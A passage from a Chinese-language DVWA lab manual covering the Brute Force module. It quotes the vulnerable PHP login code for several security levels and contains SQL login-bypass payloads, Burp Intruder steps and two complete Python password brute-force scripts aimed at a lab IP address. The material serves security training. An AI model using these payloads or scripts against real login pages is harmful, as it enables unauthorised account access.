class="token string">"&lt;p>Welcome to the password protected area {$user}&lt;/p>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;img src=\"{$avatar}\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Login failed</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>&lt;br />Username and/or password incorrect.&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p>​        可以看到，服务器只是验证了参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的sql注入漏洞[^【2】]。</p><p><strong>漏洞利用</strong>：</p><p><strong>方法一：BurpSuite爆破</strong></p><ul><li><p>Firefox设置代码，Burp Suite开启代理捕获数据包。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_包捕获.png" alt="BruteForce_包捕获"></center></li><li><p>将捕获到的包发送到Intruder模块。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_捕获包发送到Intruder.png" alt="BruteForce_捕获包发送到Intruder"></center></li><li><p>在Intruder模块的Positions选择界面中设置爆破攻击和爆破点。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_Intruder_Positions设置.png" alt="BruteForce_Intruder_Positions设置"></center></li><li><p>在Intruder模块的Payloads界面中设置username的payload类型及文件。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_Intruder_Payloads_username.png" alt="BruteForce_Intruder_Payloads_username"></center></li><li><p>设置password的payload类型及文件。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_Intruder_Payloads_password.png.png" alt="BruteForce_Intruder_Payloads_password.png"></center></li><li><p>在Intruder模块的Options界面点击【Start attack】按钮开始爆破。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_Intruder_Options_StartAttack.png" alt="BruteForce_Intruder_Options_StartAttack"></center></li><li><p>进行爆破分析。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_Intruder_Attack_Result.png" alt="BruteForce_Intruder_Attack_Result"></center></li></ul><p><strong>方法二：手工SQL注入</strong></p><ul><li><p>登录时用到的SQL</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token punctuation">`</span>users<span class="token punctuation">`</span> <span class="token keyword">WHERE</span> <span class="token keyword">user</span> <span class="token operator">=</span> <span class="token string">'$user'</span> <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token string">'$pass'</span><span class="token punctuation">;</span></code></pre></li><li><p>SQL注入设计</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token punctuation">`</span>users<span class="token punctuation">`</span> <span class="token keyword">WHERE</span> <span class="token keyword">user</span> <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token comment" spellcheck="true"># AND password = '$pass';</span><span class="token keyword">user</span>:admin' <span class="token comment" spellcheck="true">#</span>password:<span class="token punctuation">(</span>空<span class="token punctuation">)</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token punctuation">`</span>users<span class="token punctuation">`</span> <span class="token keyword">WHERE</span> <span class="token keyword">user</span> <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">or</span> <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token string">'$pass'</span><span class="token punctuation">;</span><span class="token keyword">user</span>:admin<span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span>password:<span class="token punctuation">(</span>空<span class="token punctuation">)</span></code></pre></li></ul><p><strong>方法三：自编Python脚本暴力破解</strong></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Version: python3</span><span class="token comment" spellcheck="true"># Author: Silence</span><span class="token comment" spellcheck="true"># Encoding: utf-8</span><span class="token keyword">import</span> os<span class="token keyword">import</span> requestsBASE_DIR <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read_file</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fhandler<span class="token punctuation">:</span>        <span class="token keyword">yield</span> <span class="token keyword">from</span> fhandler<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'http://{0}:{1}/dvwa/vulnerabilities/brute/'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token operator">*</span>addr<span class="token punctuation">)</span>    params <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'username'</span> <span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">'password'</span> <span class="token punctuation">:</span> password<span class="token punctuation">,</span>        <span class="token string">'Login'</span> <span class="token punctuation">:</span> <span class="token string">'Login'</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>ok <span class="token operator">and</span> \        response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'Welcome to the password protected area'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> username <span class="token keyword">in</span> read_file<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>BASE_DIR<span class="token punctuation">,</span><span class="token string">'username.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> password <span class="token keyword">in</span> read_file<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>BASE_DIR<span class="token punctuation">,</span><span class="token string">'password.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            brute_force<span class="token punctuation">(</span>addr<span class="token punctuation">,</span>username<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>password<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    server <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'124.70.137.227'</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token punctuation">)</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'Cookie'</span> <span class="token punctuation">:</span> <span class="token string">'security=low; PHPSESSID=atp0ssp267g2cgum8rvndgr855'</span>    <span class="token punctuation">}</span>    main<span class="token punctuation">(</span>server<span class="token punctuation">,</span>headers<span class="token punctuation">)</span></code></pre><p>使用：</p><ul><li>从浏览器中复制Brute Force模块登录请求中的cookie信息</li><li>使用python3运行脚本</li></ul><p>说明：</p><ul><li>遍历用户名和密码字典文件（默认为username.txt和password.txt）</li><li>使用request发送请求到dvwa，根据请求结果是否包含<code>Welcome to the password protected area</code>字符串判断是否破解成功。</li></ul><p>结果：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_POC_result.png" alt="BruteForce_POC_result"></center><h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>​        设置 DVWA 安全级别为 Medium。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Medium.png" alt="SecurityLevel_Medium"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Sanitise username input</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'username'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$user</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Sanitise password input</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Check the database</span>    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Get users details</span>        <span class="token variable">$row</span>    <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$avatar</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"avatar"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Login successful</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;p>Welcome to the password protected area {$user}&lt;/p>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;img src=\"{$avatar}\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Login failed</span>        <span class="token function">sleep</span><span class="token punctuation">(</span> <span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>&lt;br />Username and/or password incorrect.&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p>说明：        </p><ul><li>相比Low级别的代码，Medium级别的代码主要增加了<strong>mysql_real_escape_string</strong>函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，<font color="blue">在代码第6行和第10行分别对user和password进行转义</font>，<strong>基本上</strong>能够抵御sql注入攻击，说基本上是因为查到说 MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义[^【2】]；</li><li>在第11行也对<code>$pass</code>做了<strong>MD5校验</strong>，杜绝了通过参数password进行sql注入的可能性。</li><li>依然没有加入有效的<strong>防爆破机制</strong>（sleep(2)登录失败休眠2秒，在一定程度上使破解攻击时间延长，但还是不能防止爆破）。</li></ul><p><strong>漏洞利用：</strong></p><p><strong>方法一：BurpSuite爆破</strong></p><ul><li><p>Firefox设置代码，Burp Suite开启代理捕获数据包。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_包捕获_Medium.png" alt="BruteForce_包捕获_Medium"></center></li><li><p>将捕获到的包发送到Intruder模块。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_捕获包发送到Intruder_Medium.png" alt="BruteForce_捕获包发送到Intruder_Medium"></center></li><li><p>在Intruder模块的Positions选择界面中设置爆破攻击和爆破点。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_Intruder_Positions设置_Medium.png" alt="BruteForce_Intruder_Positions设置_Medium"></center></li><li><p>在Intruder模块的Payloads界面中设置username的payload类型及文件。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_Intruder_Payloads_username.png" alt="BruteForce_Intruder_Payloads_username"></center></li><li><p>设置password的payload类型及文件。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_Intruder_Payloads_password.png.png" alt="BruteForce_Intruder_Payloads_password.png"></center></li><li><p>在Intruder模块的Options界面点击【Start attack】按钮开始爆破。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_Intruder_Options_StartAttack.png" alt="BruteForce_Intruder_Options_StartAttack"></center></li><li><p>进行爆破分析。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_Intruder_Attack_Result.png" alt="BruteForce_Intruder_Attack_Result"></center></li></ul><p><strong>方法二：手工SQL注入</strong></p><ul><li><p>查看MySQL使用的编码类型。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/查看MySQL使用的编码类型.png" alt="查看MySQL使用的编码类型"></center></li><li><p>由于该版本的MySQL默认使用的UTF-8编码，而UTF-8编码无法利用UTF8编码吃掉转义符<code>\</code>[^【3】]，所以现在这种条件下不能利用UTF-8编码逃逸单引号转义。</p></li><li><p>若MySQL使用的是GBK编码时，则可通过其编码格式突破转义限制[^【4】]。</p></li></ul><p><strong>方法三：自编Python脚本暴力破解</strong></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Version: python3</span><span class="token comment" spellcheck="true"># Author: Silence</span><span class="token comment" spellcheck="true"># Encoding: utf-8</span><span class="token keyword">import</span> os<span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>thread <span class="token keyword">import</span> ThreadPoolExecutor<span class="token keyword">import</span> itertools<span class="token keyword">import</span> requestsWORKERS <span class="token operator">=</span> <span class="token number">50</span>BASE_DIR <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read_file</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fhandler<span class="token punctuation">:</span>        <span class="token keyword">yield</span> <span class="token keyword">from</span> fhandler<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    addr<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">,</span>headers <span class="token operator">=</span> data    username<span class="token punctuation">,</span>password <span class="token operator">=</span> username<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>password<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> <span class="token string">'http://{0}:{1}/dvwa/vulnerabilities/brute/'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token operator">*</span>addr<span class="token punctuation">)</span>    params <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'username'</span> <span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">'password'</span> <span class="token punctuation">:</span> password<span class="token punctuation">,</span>        <span class="token string">'Login'</span> <span class="token punctuation">:</span> <span class="token string">'Login'</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>ok <span class="token operator">and</span> \        response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'Welcome to the password protected area'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token punctuation">:</span>    usernames <span class="token operator">=</span> read_file<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>BASE_DIR<span class="token punctuation">,</span><span class="token string">'username.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    passwords <span class="token operator">=</span> read_file<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>BASE_DIR<span class="token punctuation">,</span><span class="token string">'password.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    datas <span class="token operator">=</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token punctuation">,</span>usernames<span class="token punctuation">,</span>passwords<span class="token punctuation">,</span><span class="token punctuation">[</span>headers<span class="token punctuation">]</span><span class="token punctuation">)</span>    executor <span class="token operator">=</span> ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span>WORKERS<span class="token punctuation">)</span>    <span class="token keyword">for</span> success<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">in</span> executor<span class="token punctuation">.</span>map<span class="token punctuation">(</span>brute_force<span class="token punctuation">,</span>datas<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> success<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    server <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'124.70.137.227'</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token punctuation">)</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'Cookie'</span> <span class="token punctuation">:</span> <span class="token string">'security=low; PHPSESSID=atp0ssp267g2cgum8rvndgr855'</span>    <span class="token punctuation">}</span>    main<span class="token punctuation">(</span>server<span class="token punctuation">,</span>headers<span class="token punctuation">)</span></code></pre><p>使用：</p><ul><li>从浏览器中复制Brute Force模块登录请求中的cookie信息</li><li>使用python3运行脚本</li></ul><p>说明：</p><ul><li>遍历用户名和密码字典文件（默认为username.txt和password.txt）</li><li>使用线程池机制同时发起多个请求  </li><li>使用request发送请求到dvwa，根据请求结果是否包含<code>Welcome to the password protected area</code>字符串判断是否破解成功。</li></ul><p>结果：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_POC_result2.png" alt="BruteForce_POC_result2"></center><h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><p>​        设置 DVWA 安全级别为 High。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_High.png" alt="SecurityLevel_High"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Check Anti-CSRF token</span>    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Sanitise username input</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'username'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$user</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$user</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token 